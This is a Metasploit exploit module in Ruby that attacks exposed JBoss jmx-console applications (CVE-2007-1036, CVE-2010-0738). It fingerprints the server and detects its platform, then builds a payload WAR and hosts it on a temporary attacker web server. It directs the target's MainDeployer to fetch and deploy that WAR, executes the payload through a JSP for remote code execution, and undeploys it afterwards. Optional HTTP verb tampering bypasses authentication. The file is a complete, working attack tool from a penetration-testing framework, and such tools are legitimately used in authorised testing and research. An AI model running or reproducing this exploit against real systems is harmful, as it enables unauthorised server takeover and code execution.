##
# $Id: jboss_maindeployer.rb 10754 2010-10-19 22:24:33Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'JBoss JMX Console Deployer Upload and Execute',
			'Description' => %q{
					This module can be used to execute a payload on JBoss servers that have
				an exposed "jmx-console" application. The payload is put on the server by
				using the jboss.system:MainDeployer functionality. To accomplish this, a
				temporary HTTP server is created to serve a WAR archive containing our
				payload. This method will only work if the target server allows outbound
				connections to us.
			},
			'Author'      => [ 'jduck', 'Patrick Hof' ],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 10754 $',
			'References'  =>
				[
					[ 'CVE', '2007-1036' ],
					[ 'CVE', '2010-0738' ], # by using VERB other than GET/POST
					[ 'OSVDB', '33744' ],
					[ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ]
				],
			'Privileged'  => true,
			'Platform'    => [ 'win', 'linux' ],
			'Stance'      => Msf::Exploit::Stance::Aggressive,
			'Targets'     =>
				[
					#
					# detect via /manager/serverinfo
					#
					[ 'Automatic', { } ],

					#
					# Platform specific targets only
					#
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],
					[ 'Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						},
					],

					#
					# Java version
					#
					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Payload' =>
								{
									'DisableNops' => true
								}
						}
					]
				],
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('USERNAME', [ false, 'The username to authenticate as' ]),
				OptString.new('PASSWORD', [ false, 'The password for the specified username' ]),
				OptString.new('SHELL',		[ false, 'The system shell to use', 'automatic' ]),
				OptString.new('JSP',      [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
				OptString.new('APPBASE',  [ false, 'Application base name, (default: random)', nil ]),
				OptString.new('PATH',     [ true,  'The URI path of the console', '/jmx-console' ]),
				OptString.new('VERB',     [ true,  'The HTTP verb to use (for CVE-2010-0738)', 'POST' ]),
				OptString.new('WARHOST',  [ false, 'The host to request the WAR payload from' ]),
			], self.class)
	end


	def auto_target
		print_status("Attempting to automatically select a target...")

		if not (plat = detect_platform())
			raise RuntimeError, 'Unable to detect platform!'
		end

		# TODO: detection requires HTML parsing
		arch = ARCH_X86

		# see if we have a match
		targets.each { |t|
			if (t['Platform'] == plat) and (t['Arch'] == arch)
				return t
			end
		}

		# no matching target found
		return nil
	end


	def exploit
		datastore['BasicAuthUser'] = datastore['USERNAME']
		datastore['BasicAuthPass'] = datastore['PASSWORD']

		jsp_name = datastore['JSP'] || rand_text_alphanumeric(8+rand(8))
		app_base = datastore['APPBASE'] || rand_text_alphanumeric(8+rand(8))

		verb = 'GET'
		if (datastore['VERB'] != 'GET' and datastore['VERB'] != 'POST')
			verb = 'HEAD'
		end

		mytarget = target
		if (target.name =~ /Automatic/)
			mytarget = auto_target()
			if (not mytarget)
				raise RuntimeError, "Unable to automatically select a target"
			end
			print_status("Automatically selected target \"#{mytarget.name}\"")
		else
			print_status("Using manually select target \"#{mytarget.name}\"")
		end
		arch = mytarget.arch

		# Find out which shell if we're using a Java target
		if (mytarget.name =~ /Java/)
			if not (plat = detect_platform())
				raise RuntimeError, 'Unable to detect platform!'
			end

			case plat
			when 'linux'
				datastore['SHELL'] = '/bin/sh'
			when 'win'
				datastore['SHELL'] = 'cmd.exe'
			end

			print_status("SHELL set to #{datastore['SHELL']}")
		else
			# set arch/platform from the target
			plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]
		end

		# We must regenerate the payload in case our auto-magic changed something.
		return if ((p = exploit_regenerate_payload(plat, arch)) == nil)

		# Generate the WAR containing the payload
		if (mytarget.name =~ /Java/)
			@war_data = Msf::Util::EXE.to_war(p.encoded,
				{
					:app_name => app_base,
					:jsp_name => jsp_name
				})
		else
			exe = generate_payload_exe(
				{
					:code => p.encoded,
					:arch => arch,
					:platform => plat
				})
			@war_data = Msf::Util::EXE.to_jsp_war(exe,
				{
					:app_name => app_base,
					:jsp_name => jsp_name
				})
		end


		#
		# UPLOAD
		#
		resource_uri = '/' + app_base + '.war'
		service_url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'] + resource_uri
		print_status("Starting up our web service on #{service_url} ...")
		start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_uri(cli, req)
				},
				'Path' => resource_uri
			}})

		if (datastore['WARHOST'])
			service_url = 'http://' + datastore['WARHOST'] + ':' + datastore['SRVPORT'] + resource_uri
		end

		print_status("Asking the JBoss server to deploy (via MainDeployer) #{service_url}")
		if (verb == "POST")
			res = send_request_cgi({
					'method'    => verb,
					'uri'       => datastore['PATH'] + '/HtmlAdaptor',
					'vars_post' =>
						{
							'action'      => 'invokeOpByName',
							'name'        => 'jboss.system:service=MainDeployer',
							'methodName'  => 'deploy',
							'argType'     => 'java.lang.String',
							'arg0'        => service_url
						}
				})
		else
			res = send_request_cgi({
					'method'    => verb,
					'uri'       => datastore['PATH'] + '/HtmlAdaptor',
					'vars_get' =>
						{
							'action'      => 'invokeOpByName',
							'name'        => 'jboss.system:service=MainDeployer',
							'methodName'  => 'deploy',
							'argType'     => 'java.lang.String',
							'arg0'        => service_url
						}
				})
		end
		if (! res)
			raise RuntimeError, "Unable to deploy WAR archive [No Response]"
		end
		if (res.code < 200 or res.code >= 300)
			case res.code
			when 401
				print_error("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
			end
			raise RuntimeError, "Upload to deploy WAR archive [#{res.code} #{res.message}]"
		end

		# wait for the data to be sent
		print_status("Waiting for the server to request the WAR archive....")
		waited = 0
		while (not @war_sent)
			select(nil, nil, nil, 1)
			waited += 1
			if (waited > 30)
				raise RuntimeError, 'Server did not request WAR archive -- Maybe it cant connect back to us?'
			end
		end

		print_status("Shutting down the web service...")
		stop_service


		#
		# EXECUTE
		#
		print_status("Executing #{app_base}...")

		# JBoss might need some time for the deployment. Try 5 times at most and
		# wait 3 seconds inbetween tries
		num_attempts = 5
		num_attempts.times { |attempt|
			res = send_request_cgi({
					'uri'     => '/' + app_base + '/' + jsp_name + '.jsp',
					'method'  => verb
				}, 20)

			msg = nil
			if (! res)
				msg = "Execution failed on #{app_base} [No Response]"
			elsif (res.code < 200 or res.code >= 300)
				msg = "Execution failed on #{app_base} [#{res.code} #{res.message}]"
			elsif (res.code == 200)
				print_good("Successfully triggered payload at '#{uri}'")
				break
			end

			if (attempt < num_attempts - 1)
				msg << ", retrying in 3 seconds..."
				print_error(msg)

				select(nil, nil, nil, 3)
			else
				print_error(msg)
			end
		}

		#
		# DELETE
		#
		# XXX: Does undeploy have an invokeByName?
		#
		print_status("Undeploying #{app_base} ...")
		res = send_request_cgi({
			'method'    => verb,
			'uri'       => datastore['PATH'] + '/HtmlAdaptor',
			'vars_post' =>
				{
					'action'      => 'invokeOpByName',
					'name'        => 'jboss.system:service=MainDeployer',
					'methodName'  => 'methodName=undeploy',
					'argType'     => 'java.lang.String',
					'arg0'        => app_base
				}
		}, 20)
		if (! res)
			print_error("WARNING: Undeployment failed on #{app_base} [No Response]")
		elsif (res.code < 200 or res.code >= 300)
			print_error("WARNING: Undeployment failed on #{app_base} [#{res.code} #{res.message}]")
		end

		handler
	end


	# Handle incoming requests from the server
	def on_request_uri(cli, request)

		#print_status("on_request_uri called: #{request.inspect}")
		if (not @war_data)
			print_error("A request came in, but the WAR archive wasn't ready yet!")
			return
		end

		print_status("Sending the WAR archive to the server...")
		send_response(cli, @war_data)
		@war_sent = true
	end


	# Try to autodetect the target platform
	def detect_platform()
		print_status("Attempting to automatically detect the platform...")

		path = datastore['PATH'] + '/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo'
		res = send_request_raw(
			{
				'uri'    => path
			}, 20)

		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting #{path}")
			return nil
		end

		if (res.body =~ /<td.*?OSName.*?(Linux|Windows).*?<\/td>/m)
			os = $1
			if (os =~ /Linux/i)
				return 'linux'
			elsif (os =~ /Windows/i)
				return 'win'
			end
		end
		nil
	end

end